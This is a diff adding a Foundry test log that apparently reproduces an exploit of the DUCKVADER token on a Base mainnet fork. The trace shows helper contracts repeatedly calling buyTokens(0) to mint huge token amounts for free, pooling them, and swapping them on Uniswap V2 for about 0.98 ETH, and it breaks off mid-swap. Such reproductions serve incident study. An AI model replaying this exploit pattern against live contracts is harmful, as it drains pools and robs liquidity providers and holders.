@@ -1,0 +1,283 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/DUCKVADER_exp.sol:DUCKVADER_exp
+[PASS] testExploit() (gas: 3281923)
+Logs:
+  Attacker Before exploit ETH Balance: 0.000000000000000000
+  Attacker After exploit ETH Balance: 0.981901804907398327
+
+Traces:
+  [7057] DUCKVADER_exp::setUp()
+    ├─ [0] VM::createSelectFork("base", 27445834 [2.744e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(DUCKVADER: [0xaa8f35183478B8EcEd5619521Ac3Eb3886E98c56], "DUCKVADER")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24], "Uniswap: V2 Router02")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [3523523] DUCKVADER_exp::testExploit()
+    ├─ [0] VM::deal(DUCKVADER_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit ETH Balance", val: 0, decimals: 18)
+    ├─ [635007] → new AttackContract@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Return] 3061 bytes of code
+    ├─ [2836502] AttackContract::attack()
+    │   ├─ [189830] → new AttackContract2@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [72742] AttackContract2::buy()
+    │   │   ├─ [35614] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0x00000000000000000000000000000000000000193e5939a08ce9dbd480000000
+    │   │   │   │   @ 0x7043bae652c970425560f5ef12e16fb0f44ad00f0d3354ec7a452e0d8ed61736: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [31500] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   │   @ 0x7043bae652c970425560f5ef12e16fb0f44ad00f0d3354ec7a452e0d8ed61736: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [189830] → new AttackContract2@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [39542] AttackContract2::buy()
+    │   │   ├─ [30814] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x00000000000000000000000000000000000000193e5939a08ce9dbd480000000 → 0x0000000000000000000000000000000000000025dd85d670d35ec9bec0000000
+    │   │   │   │   @ 0x5d39de7d8d40864b23c6c117288a111543f23aa7e1972faf942dc9abe969aad3: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [5600] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5d39de7d8d40864b23c6c117288a111543f23aa7e1972faf942dc9abe969aad3: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0x00000000000000000000000000000000000000193e5939a08ce9dbd480000000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [189830] → new AttackContract2@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [39542] AttackContract2::buy()
+    │   │   ├─ [30814] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x0000000000000000000000000000000000000025dd85d670d35ec9bec0000000 → 0x00000000000000000000000000000000000000327cb2734119d3b7a900000000
+    │   │   │   │   @ 0x8b5b6fedba96853f3e741a4dd76edc3c6856e77495496aa737e75ae5b76284f0: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [5600] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x00000000000000000000000000000000000000193e5939a08ce9dbd480000000 → 0x0000000000000000000000000000000000000025dd85d670d35ec9bec0000000
+    │   │   │   │   @ 0x8b5b6fedba96853f3e741a4dd76edc3c6856e77495496aa737e75ae5b76284f0: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [189830] → new AttackContract2@0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [39542] AttackContract2::buy()
+    │   │   ├─ [30814] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb54a6572452824813ea93bd6081b70bcc6937dfeecd3b1b75834b0bb873f049f: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   │   @ 3: 0x00000000000000000000000000000000000000327cb2734119d3b7a900000000 → 0x000000000000000000000000000000000000003f1bdf10116048a59340000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [5600] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb54a6572452824813ea93bd6081b70bcc6937dfeecd3b1b75834b0bb873f049f: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x0000000000000000000000000000000000000025dd85d670d35ec9bec0000000 → 0x00000000000000000000000000000000000000327cb2734119d3b7a900000000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [189830] → new AttackContract2@0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [39542] AttackContract2::buy()
+    │   │   ├─ [30814] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x000000000000000000000000000000000000003f1bdf10116048a59340000000 → 0x000000000000000000000000000000000000004bbb0bace1a6bd937d80000000
+    │   │   │   │   @ 0x60ec0911d1d04abc11de5f502fce909c04db7829e0f45cc2adfc3189772c57a7: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [5600] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x60ec0911d1d04abc11de5f502fce909c04db7829e0f45cc2adfc3189772c57a7: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x00000000000000000000000000000000000000327cb2734119d3b7a900000000 → 0x000000000000000000000000000000000000003f1bdf10116048a59340000000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [189830] → new AttackContract2@0xD76ffbd1eFF76C510C3a509fE22864688aC3A588
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [39542] AttackContract2::buy()
+    │   │   ├─ [30814] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0xD76ffbd1eFF76C510C3a509fE22864688aC3A588], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0xD76ffbd1eFF76C510C3a509fE22864688aC3A588], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xfeefd5ff9e47b7aef3348b69b160c85241564fd855df1066eb4483024bf7279c: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   │   @ 3: 0x000000000000000000000000000000000000004bbb0bace1a6bd937d80000000 → 0x00000000000000000000000000000000000000585a3849b1ed328167c0000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0xD76ffbd1eFF76C510C3a509fE22864688aC3A588]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [5600] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0xD76ffbd1eFF76C510C3a509fE22864688aC3A588], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xfeefd5ff9e47b7aef3348b69b160c85241564fd855df1066eb4483024bf7279c: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000003f1bdf10116048a59340000000 → 0x000000000000000000000000000000000000004bbb0bace1a6bd937d80000000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [189830] → new AttackContract2@0x4ff05a443250A64a18C68CEdd2122cFDf3872140
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [39542] AttackContract2::buy()
+    │   │   ├─ [30814] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x4ff05a443250A64a18C68CEdd2122cFDf3872140], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x4ff05a443250A64a18C68CEdd2122cFDf3872140], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x00000000000000000000000000000000000000585a3849b1ed328167c0000000 → 0x0000000000000000000000000000000000000064f964e68233a76f5200000000
+    │   │   │   │   @ 0x61ea03f4a5d21db715039a0ee09b6d7c7d53825f16ad026dfe21c2a193ef8a13: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0x4ff05a443250A64a18C68CEdd2122cFDf3872140]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [5600] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0x4ff05a443250A64a18C68CEdd2122cFDf3872140], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x61ea03f4a5d21db715039a0ee09b6d7c7d53825f16ad026dfe21c2a193ef8a13: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000004bbb0bace1a6bd937d80000000 → 0x00000000000000000000000000000000000000585a3849b1ed328167c0000000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [189830] → new AttackContract2@0xc98D9175A32ca68C4B83dB84B4707AF82ae37cC4
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [39542] AttackContract2::buy()
+    │   │   ├─ [30814] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0xc98D9175A32ca68C4B83dB84B4707AF82ae37cC4], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0xc98D9175A32ca68C4B83dB84B4707AF82ae37cC4], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xf9db4ad7295c63f5a9b6f2b36bd186b191253b6dadb4be09996f15f8a30dee62: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   │   @ 3: 0x0000000000000000000000000000000000000064f964e68233a76f5200000000 → 0x0000000000000000000000000000000000000071989183527a1c5d3c40000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0xc98D9175A32ca68C4B83dB84B4707AF82ae37cC4]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [5600] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0xc98D9175A32ca68C4B83dB84B4707AF82ae37cC4], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xf9db4ad7295c63f5a9b6f2b36bd186b191253b6dadb4be09996f15f8a30dee62: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x00000000000000000000000000000000000000585a3849b1ed328167c0000000 → 0x0000000000000000000000000000000000000064f964e68233a76f5200000000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [189830] → new AttackContract2@0x40b4863C923385D1632d640B097DDeA6EaB92e76
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [39542] AttackContract2::buy()
+    │   │   ├─ [30814] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x40b4863C923385D1632d640B097DDeA6EaB92e76], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x40b4863C923385D1632d640B097DDeA6EaB92e76], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x0000000000000000000000000000000000000071989183527a1c5d3c40000000 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
+    │   │   │   │   @ 0xf145db375e5ecbdc9022265509b71a2c7dca3bde856e5751d1c1f718e8b69dcd: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0x40b4863C923385D1632d640B097DDeA6EaB92e76]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [5600] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0x40b4863C923385D1632d640B097DDeA6EaB92e76], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x0000000000000000000000000000000000000064f964e68233a76f5200000000 → 0x0000000000000000000000000000000000000071989183527a1c5d3c40000000
+    │   │   │   │   @ 0xf145db375e5ecbdc9022265509b71a2c7dca3bde856e5751d1c1f718e8b69dcd: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [189830] → new AttackContract2@0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976
+    │   │   └─ ← [Return] 948 bytes of code
+    │   ├─ [39542] AttackContract2::buy()
+    │   │   ├─ [30814] DUCKVADER::buyTokens(0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract2: [0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x000000000000000000000000000000000000007e37be2022c0914b2680000000 → 0x000000000000000000000000000000000000008ad6eabcf307063910c0000000
+    │   │   │   │   @ 0x90c50a656a735e67a880074483b3516119e7667d6690f3c56e3fe812a73e437f: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [897] DUCKVADER::balanceOf(AttackContract2: [0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
+    │   │   ├─ [5600] DUCKVADER::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x90c50a656a735e67a880074483b3516119e7667d6690f3c56e3fe812a73e437f: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x0000000000000000000000000000000000000071989183527a1c5d3c40000000 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [8914] DUCKVADER::buyTokens(0)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000000000 [1e30])
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0x000000000000000000000000000000000000008ad6eabcf307063910c0000000 → 0x0000000000000000000000000000000000000097761759c34d7b26fb00000000
+    │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000007e37be2022c0914b2680000000 → 0x000000000000000000000000000000000000008ad6eabcf307063910c0000000
+    │   │   └─ ← [Stop]
+    │   ├─ [25267] DUCKVADER::approve(Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfd32b51d31abd3f60138b02ac9d97d42146bd2f6b2f2c1041963607f59ac36d7: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [897] DUCKVADER::balanceOf(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 11000000000000000000000000000000 [1.1e31]
+    │   ├─ [140592] Uniswap: V2 Router02::swapExactTokensForETHSupportingFeeOnTransferTokens(11000000000000000000000000000000 [1.1e31], 0, [0xaa8f35183478B8EcEd5619521Ac3Eb3886E98c56, 0x4200000000000000000000000000000000000006], DUCKVADER_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1741681025 [1.741e9])
+    │   │   ├─ [45401] DUCKVADER::transferFrom(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x5858CA3964458c29fD7EaC2c1bADa297b5d122Ab, 11000000000000000000000000000000 [1.1e31])
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x000000000000000000000000000000000000dEaD, value: 10890000000000000000000000000000 [1.089e31])
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x5858CA3964458c29fD7EaC2c1bADa297b5d122Ab, value: 110000000000000000000000000000 [1.1e29])
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24], value: 115792089237316195423570985008687907853269984654640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000008ad6eabcf307063910c0000000 → 0
+    │   │   │   │   @ 0xfd32b51d31abd3f60138b02ac9d97d42146bd2f6b2f2c1041963607f59ac36d7: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffff752915430cf8f9c6ef3fffffff
+    │   │   │   │   @ 0xb34209a263f6c38fe55f099e9e70f9d67e93982480ff3234a5e0108028ad164d: 0 → 0x0000000000000000000000000000000000000089737cdee65b6f1ee510000000
+    │   │   │   │   @ 0xa584c95099cb92c03e60f9268b1db89353912eff20959395982afd064976b347: 0x0000000000000000000000000000000000000006a6b4df913452ae8e7c35443e → 0x00000000000000000000000000000000000000080a22bd9ddfe9c8ba2c35443e
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2504] 0x5858CA3964458c29fD7EaC2c1bADa297b5d122Ab::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 5699920272568264563 [5.699e18], 526962149129733778604847088702 [5.269e29], 1741616039 [1.741e9]
+    │   │   ├─ [897] DUCKVADER::balanceOf(0x5858CA3964458c29fD7EaC2c1bADa297b5d122Ab) [staticcall]
+    │   │   │   └─ ← [Return] 636962149129733778604847088702 [6.369e29]
+    │   │   ├─ [64878] 0x5858CA3964458c29fD7EaC2c1bADa297b5d122Ab::swap(981901804907398327 [9.819e17], 0, Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24], 0x)
+    │   │   │   ├─ [29701] 0x4200000000000000000000000000000000000006::transfer(Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24], 981901804907398327 [9.819e17])
+    │   │   │   │   ├─ emit Transfer(from: 0x5858CA3964458c29fD7EaC2c1bADa297b5d122Ab, to: Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24], value: 981901804907398327 [9.819e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd9805c00c86fe68e024b0325a0df63c677be422e449496145b7de46c8323b69a: 0x0000000000000000000000000000000000000000000000004f1a2f49d67aa773 → 0x0000000000000000000000000000000000000000000000004179c4cc98a8a2bc
+    │   │   │   │   │   @ 0x9b1c5bf75cd5b8b8e9d62f21b99ccb64a293224d5361076980402429d1b27917: 0 → 0x0000000000000000000000000000000000000000000000000da06a7d3dd204b7
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [457] 0x4200000000000000000000000000000000000006::balanceOf(0x5858CA3964458c29fD7EaC2c1bADa297b5d122Ab) [staticcall]
+    │   │   │   │   └─ ← [Return] 4718018467660866236 [4.718e18]
+    │   │   │   ├─ [897] DUCKVADER::balanceOf(0x5858CA3964458c29fD7EaC2c1bADa297b5d122Ab) [staticcall]
+    │   │   │   │   └─ ← [Return] 636962149129733778604847088702 [6.369e29]
+    │   │   │   ├─ emit Sync(reserve0: 4718018467660866236 [4.718e18], reserve1: 636962149129733778604847088702 [6.369e29])
